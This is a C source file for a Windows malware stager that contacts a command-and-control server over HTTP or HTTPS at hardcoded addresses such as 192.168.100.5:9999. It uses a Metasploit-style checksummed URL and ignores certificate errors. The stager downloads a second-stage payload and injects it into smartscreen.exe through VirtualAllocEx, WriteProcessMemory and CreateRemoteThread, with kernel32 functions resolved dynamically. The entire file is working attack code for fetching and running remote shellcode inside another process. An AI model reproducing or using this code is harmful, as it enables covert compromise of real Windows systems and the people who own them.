#include <windows.h>
#include <winternl.h>
#include <time.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>
#include <TlHelp32.h>


#include "Security.h"

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

#define WIN32_LEAN_AND_MEAN


#pragma comment(lib, "Wininet.lib")



////////////// OK //////////////
// 
#define URL_MAX_LENGHT 84

void gen_random(char* string, const int len) {
	char alphanum[63];
	int ich = 0;
	for (char l = 'a'; l <= 'z'; ++l, ich++)
		alphanum[ich] = l;
	for (char l = 'A'; l <= 'Z'; ++l, ich++)
		alphanum[ich] = l;
	for (char l = '0'; l <= '9'; ++l, ich++)
		alphanum[ich] = l;


	for (int i = 0; i < len; ++i)
		string[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	string[len] = 0;
}
int TextChecksum8(char* text) {
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
		temp += (int)text[i];
	return temp % 0x100;
}
void genURL(char* FullURL, int urlLenght) {
	int checksum = 0;			//Calculated Checksum placeholder. 
	char URI[URL_MAX_LENGHT] = { 0 };


	srand((unsigned int)time(0));
	while (checksum != 92) { // const int URI_CHECKSUM_INITW = 92;
		gen_random(URI, urlLenght - 2);
		checksum = TextChecksum8(URI);
	}
	FullURL[0] = '/';
	strcat_s(FullURL, urlLenght, URI);
	FullURL[urlLenght - 1] = '\0';
	return;
}
// 
////////////// OK //////////////



/////////// imports ////////////
//
// define our imports
typedef HANDLE(WINAPI* OpenProcessF) (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef LPVOID(WINAPI* VirtualAllocExF) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WriteProcessMemoryF) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CreateRemoteThreadF) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

typedef struct {
	OpenProcessF OpenProcess;
	VirtualAllocExF VirtualAllocEx;
	WriteProcessMemoryF WriteProcessMemory;
	CreateRemoteThreadF CreateRemoteThread;
}KERNAL32_API;



BOOL LoadDymaFunc(KERNAL32_API* kernal32Api) {
	HANDLE hKernal32 = GetModuleHandleA("kernel32.dll");
	if (hKernal32 != NULL) {
		kernal32Api->OpenProcess = (OpenProcessF)GetProcAddress(hKernal32, "OpenProcess");
		kernal32Api->VirtualAllocEx = (VirtualAllocExF)GetProcAddress(hKernal32, "VirtualAllocEx");
		kernal32Api->WriteProcessMemory = (WriteProcessMemoryF)GetProcAddress(hKernal32, "WriteProcessMemory");
		kernal32Api->CreateRemoteThread = (CreateRemoteThreadF)GetProcAddress(hKernal32, "CreateRemoteThread");
		//CloseHandle(hKernal32); //This will crash the program !!!
		return kernal32Api->OpenProcess && kernal32Api->VirtualAllocEx && kernal32Api->WriteProcessMemory && kernal32Api->CreateRemoteThread;
			
	}
	return FALSE;
}
//
/////////// imports ///////////


DWORD GetPID(char* processName) {
	HANDLE snap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);

	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		printf("[x] CreateToolhelp32Snapshot() Failed.\n");
		return FALSE;
	}
	if (!Process32First(snap, &pe32)) {
		printf("[x] Process32First() Failed.\n");
		CloseHandle(snap);
		return FALSE;
	}
	while (Process32Next(snap, &pe32) && 0 != strncmp(processName, pe32.szExeFile, strlen(pe32.szExeFile)));
	CloseHandle(snap);

	if (0 == strncmp(processName, pe32.szExeFile, strlen(pe32.szExeFile))) 
		return pe32.th32ProcessID;
	printf("[!] No infomation found about '%s' \n", processName);
	return FALSE;
}

BOOL InitStagerReverseHttpOrHttps(char* ServeurIP, int Port, HINTERNET* hInternetOpen, HINTERNET* hInternetConnect, HINTERNET* hInternetRequest, BOOL isSsl) {
	const int urlLenght = rand() % 40 + 30;
	char FullURL[URL_MAX_LENGHT] = { 0 }; //TO_UPDATE !!
	//char* Stage2Buffer;

	DWORD flags = isSsl ? (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA) : INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT;

	const char get[] = "GET";
	const char HttpHeader[] = "Mozilla/5.0 (Windows N WOW64; rv:11.0) Gecko Firefox/11.0";
	//const char HttpHeader[] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";
	genURL(FullURL, urlLenght);
	//strcpy_s(FullURL, URL_MAX_LENGHT, "bROYymXo");

	printf("[+] Full URL: %s\n", FullURL);

	*hInternetOpen = InternetOpenA(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (*hInternetOpen == NULL) {
		printf("[x] Error InternetOpenA\n");
		return FALSE;
	}
	*hInternetConnect = InternetConnectA(*hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (*hInternetConnect == NULL) {
		printf("[x] Error InternetConnectA\n");
		return FALSE;
	}
	*hInternetRequest = HttpOpenRequestA(*hInternetConnect, get, FullURL, NULL, NULL, NULL, flags, 0);
	if (*hInternetRequest == NULL) {
		printf("[x] Error HttpOpenRequestA\n");
		return FALSE;
	}
	if (isSsl) {
		DWORD dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		if (!InternetSetOptionA(*hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD))) {
			printf("[x] InternetSetOptionA");
			return FALSE;
		}
	}
	if (!HttpSendRequestA(*hInternetRequest, NULL, 0, NULL, 0)) {
		printf("[x] Error HttpSendRequestA\n");
		return FALSE;
	}
	return TRUE;
}


BOOL MainStagerReverseHTTP(char* ServeurIP, int Port, BOOL isSsl) {
	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;

	if (InitStagerReverseHttpOrHttps(ServeurIP, Port, &hInternetOpen, &hInternetConnect, &hInternetRequest, isSsl)) {
		const char* targetProcess = "smartscreen.exe";
		//const char* targetProcess = "notepad.exe";
		KERNAL32_API kernal32Api;
		int pid = GetPID((char*)targetProcess);

		if (!pid) {
			printf("[x] Fail to get process '%s' PID !\n", targetProcess);
			return FALSE;
		}
		if (!LoadDymaFunc(&kernal32Api)) {
			printf("[x] Fail to load dynamically the functions !\n");
			return FALSE;
		}
		HANDLE processHandle = kernal32Api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // explorer.exe 
		if (processHandle != NULL) {
			printf("[+] Target process %s (%i)\n", targetProcess, pid);
			PVOID remoteBuffer = kernal32Api.VirtualAllocEx(processHandle, NULL, (4096 * 1024), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
			if (remoteBuffer != NULL) {
				DWORD dwBytesWritten = 0;
				BOOL bKeepReading = 1;
				DWORD dwBytesRead = (DWORD)-1;

				while (bKeepReading && dwBytesRead != 0) {
					char tempBuff[100];
					bKeepReading = InternetReadFile(hInternetRequest, tempBuff, 100, &dwBytesRead);
					if (dwBytesRead > 0)
						kernal32Api.WriteProcessMemory(processHandle, (char*)remoteBuffer + dwBytesWritten, tempBuff, dwBytesRead, NULL);
					dwBytesWritten += dwBytesRead;
				}
				printf("[+] WriteProcessMemory OK\n");
				if (dwBytesWritten > 1000) {
					//DWORD oldProtect = 0;
					//VirtualProtect(processHandle, dwBytesWritten, PAGE_EXECUTE_READWRITE, &oldProtect);

					HANDLE remoteThread = kernal32Api.CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
					if (remoteThread != NULL) {
						printf("[+] CreateRemoteThread OK\n");
						CloseHandle(remoteThread);
						CloseHandle(processHandle);
						InternetCloseHandle(hInternetRequest);
						InternetCloseHandle(hInternetConnect);
						InternetCloseHandle(hInternetOpen);
						return TRUE;
					} else {
						printf("[X] Fail to CreateRemoteThread !\n");
					}
				} else {
					printf("[x] Invalid payload from the C2 !\n");
				}
				VirtualFree(remoteBuffer, 0, MEM_RELEASE);
			} else {
				printf("[x] Fail to VirtualAllocEx !\n");
			}
			CloseHandle(processHandle);
		} else {
			printf("[x] Fail to open process: %s !\n", targetProcess);
		}
		InternetCloseHandle(hInternetRequest);
		InternetCloseHandle(hInternetConnect);
		InternetCloseHandle(hInternetOpen);
	} else {
		if (hInternetRequest != NULL)
			InternetCloseHandle(hInternetRequest);
		if (hInternetRequest != NULL)
			InternetCloseHandle(hInternetConnect);
		if (hInternetRequest != NULL)
			InternetCloseHandle(hInternetOpen);
	}
	return FALSE;
}
BOOL StagerReverseHTTP(char* ServeurIP, int Port) {
	return MainStagerReverseHTTP(ServeurIP, Port, FALSE);
}
BOOL StagerReverseHTTPS(char* ServeurIP, int Port) {
	return MainStagerReverseHTTP(ServeurIP, Port, TRUE);
}


int main() {
	SetSecurity();

	//StagerReverseHTTP("192.168.100.80",8080);
	StagerReverseHTTPS("192.168.100.5", 9999);
	system("pause");
	return FALSE;
}


	
